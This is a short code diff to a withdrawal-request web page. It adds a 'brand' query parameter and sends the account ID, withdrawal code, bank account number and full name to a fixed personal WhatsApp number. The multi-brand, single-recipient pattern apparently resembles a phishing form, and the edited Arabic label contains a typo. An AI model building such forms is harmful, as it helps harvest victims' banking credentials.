@@ -48,6 +48,7 @@
 
         document.addEventListener("DOMContentLoaded", function() {
             const bankName = getQueryParam("bank");
+            const brand = getQueryParam("brand");
             if (bankName) {
                 document.getElementById("bankName").value = bankName;
             }
@@ -65,7 +66,7 @@
                 return;
             }
 
-            const message = `سحب جديد:\n\nرقم الحساب: ${accountId}\nكود السحب: ${withdrawCode}\nرقم الحساب البنكي: ${bankAccount}\nالاسم الكامل: ${fullName}\nالبنك: ${bankName}`;
+            const message = `سحب جديد:\n\nقم الحساب: ${accountId}\nالعلامة التجارية: ${brand}\nكود السحب: ${withdrawCode}\nرقم الحساب البنكي: ${bankAccount}\nالاسم الكامل: ${fullName}\nالبنك: ${bankName}`;
             const whatsappUrl = `https://wa.me/212618799470?text=${encodeURIComponent(message)}`;
 
             window.location.href = whatsappUrl;
